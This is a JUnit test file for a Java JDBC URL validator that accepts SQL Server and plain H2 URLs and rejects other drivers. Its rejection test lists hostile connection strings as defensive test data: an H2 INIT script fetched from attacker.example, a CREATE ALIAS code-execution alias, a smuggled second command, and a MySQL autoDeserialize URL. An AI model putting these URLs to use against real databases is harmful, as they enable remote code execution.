package com.crisil.covenant.util;

import static org.assertj.core.api.Assertions.assertThatCode;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import com.crisil.covenant.exception.ApiException;
import org.junit.jupiter.api.Test;

class JdbcUrlPolicyTest {

    @Test
    void acceptsSqlServerAndPlainH2() {
        assertThatCode(() -> JdbcUrlPolicy.requireSafe("jdbc:sqlserver://db:1433;databaseName=x"))
                .doesNotThrowAnyException();
        assertThatCode(() -> JdbcUrlPolicy.requireSafe("jdbc:h2:mem:test;MODE=MSSQLServer"))
                .doesNotThrowAnyException();
    }

    @Test
    void refusesOtherDriversAndH2InitScripts() {
        for (String url : new String[] {
            "jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://attacker.example/x.sql'",
            "JDBC:H2:mem:x;init=CREATE ALIAS EXEC AS 'x'",
            "jdbc:h2:mem:x;MODE=MSSQLServer\\;RunScript FROM 'x'",
            "jdbc:postgresql://db/x",
            "jdbc:mysql://db/x?autoDeserialize=true",
        }) {
            assertThatThrownBy(() -> JdbcUrlPolicy.requireSafe(url))
                    .isInstanceOf(ApiException.class)
                    .extracting("code").isEqualTo("DATA_SOURCE_JDBC_URL_INVALID");
        }
    }

    @Test
    void h2CanBeTurnedOffForSavedSources() {
        assertThatCode(() -> JdbcUrlPolicy.requireAllowed("jdbc:h2:mem:x", true)).doesNotThrowAnyException();
        assertThatCode(() -> JdbcUrlPolicy.requireAllowed("jdbc:sqlserver://db", false))
                .doesNotThrowAnyException();
        assertThatThrownBy(() -> JdbcUrlPolicy.requireAllowed("jdbc:h2:mem:x", false))
                .isInstanceOf(ApiException.class)
                .hasMessageContaining("not allowed");
    }
}
